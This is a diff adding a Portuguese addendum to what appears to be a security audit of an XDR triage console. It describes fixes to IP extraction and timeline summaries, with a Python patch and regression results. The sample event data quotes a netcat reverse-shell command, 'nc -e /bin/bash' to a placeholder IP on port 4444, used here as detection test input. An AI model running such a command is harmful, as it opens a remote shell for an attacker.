@@ -186,3 +186,80 @@ Nenhum desses é finding — são melhorias de UX/perf.
 | Tempo médio operador → ação          | ~5 cliques| 1 clique|
 
 Postura de segurança não regrediu. Ergonomia melhorou substancialmente.
+
+---
+
+## 8. Addendum T15 — Patches pós-E2E (2026-04-26)
+
+Teste E2E real (Claude in Chrome dirigindo Chrome no Windows do usuário, login admin → criar tenant → ingestar payload XDR → abrir HTV) revelou 2 findings de credibilidade no triage. Ambos corrigidos, com regressão automatizada.
+
+### 8.1 F-T14-1 — `next_action` imprimia label do detector como IP
+
+**Sintoma observado.** Após ingestar evento CRITICAL com `source: "xdr.agent"`, a UI mostrava:
+
+> **Próxima ação:** Bloquear IP **xdr.agent** imediatamente.
+
+O campo `source` no payload é o label do detector (ex.: `xdr.agent`, `sigma_rule`, `manual`), nunca um IP. O código pegava o primeiro candidato disponível (`first.get("source") or first.get("source_ip")`) e cuspia direto na mensagem — qualquer alerta sem `source_ip` quebrava a credibilidade da triagem.
+
+**Patch (`_host_next_action`, linha ~7974):**
+
+```python
+src_ip = (
+    first.get("source_ip")
+    or first.get("auth_source_ip")
+    or first.get("network_dst_ip")
+    or ""
+)
+looks_like_ip = bool(src_ip) and ("." in src_ip or ":" in src_ip)
+if looks_like_ip:
+    return {"action": f"Bloquear IP {src_ip} e conter host", ...}
+return {"action": f"Conter host — investigar regra: {rule}", ...}
+```
+
+Mudanças:
+
+1. Removido o fallback para `first.get("source")` — campo errado, nunca contém IP.
+2. Candidatos a IP vêm só de `source_ip`, `auth_source_ip`, `network_dst_ip` — campos que o XDR engine de fato preenche com IP.
+3. Validação leve `looks_like_ip` (precisa conter `.` ou `:`) — defesa em profundidade contra futura adição de campo que pareça IP mas não seja.
+4. Fallback sem IP retorna ação focada na regra (`Conter host — investigar regra: {rule}`).
+
+### 8.2 F-T14-2 — Timeline genérica escondia o evento real
+
+**Sintoma observado.** Timeline mostrava 50× a mesma linha: "Structured endpoint event". O detector já havia processado `process_name=nc`, `command_line=nc -e /bin/bash 203.0.113.10 4444`, `network_dst_ip=203.0.113.10`, `network_dst_port=4444` — nada disso chegava ao operador.
+
+**Patch (`admin_tenant_host_triage`, linha ~8125):**
+
+Adicionado helper `_summarize_event(ev)` que devolve uma linha humana:
+
+- Se tem `process_name + command_line` → `"nc → nc -e /bin/bash 203.0.113.10 4444"` (cmd truncado em 80c).
+- Se tem só process → process.
+- Se tem `auth_source_ip` → `"auth failure from 45.155.205.233"`.
+- Se tem `network_dst_ip` → `"connection → 203.0.113.10:4444"`.
+- Fallback → `rule_name` ou `event_type`.
+
+E o item da timeline agora carrega 7 chaves novas: `event_type`, `summary`, `process_name`, `command_line`, `username`, `source_ip`, `network_dst_ip`, `network_dst_port`.
+
+Tamanho do payload subiu marginalmente (~120 bytes/item), com cap de 50 itens — irrelevante para latência.
+
+### 8.3 Regressão T15
+
+| ID    | O que valida                                                                      |
+| ----- | --------------------------------------------------------------------------------- |
+| t15a  | `_host_next_action` usa só campos de IP reais + `looks_like_ip` + fallback sem IP |
+| t15b  | `admin_tenant_host_triage` expõe 7 campos de detalhe na timeline + `summary`      |
+
+Resultado: **34/34 passando** (32 anteriores + 2 novos T15). Nenhum WARN.
+
+```bash
+python3 run_pentest_audit.py
+# === 34/34 passaram ===
+```
+
+### 8.4 Findings remanescentes do E2E (escopo posterior)
+
+Não foram corrigidos em T15 — agendados para T16+:
+
+- **F-AGENT-1** (`/api/agent/events`): sob auth admin, `tenant_id` no body é ignorado, host fica em `tenant_id="admin"`. `AgentService.record_heartbeat` precisa propagar tenant igual `register_host` já faz.
+- **F-HOST-1**: hosts órfãos (`tenant_id="admin"`) não aparecem em nenhum drilldown — precisa varredura pós-fix de F-AGENT-1.
+
+Ambos são INFO/MEDIUM — não bloqueiam release de T14/T15.
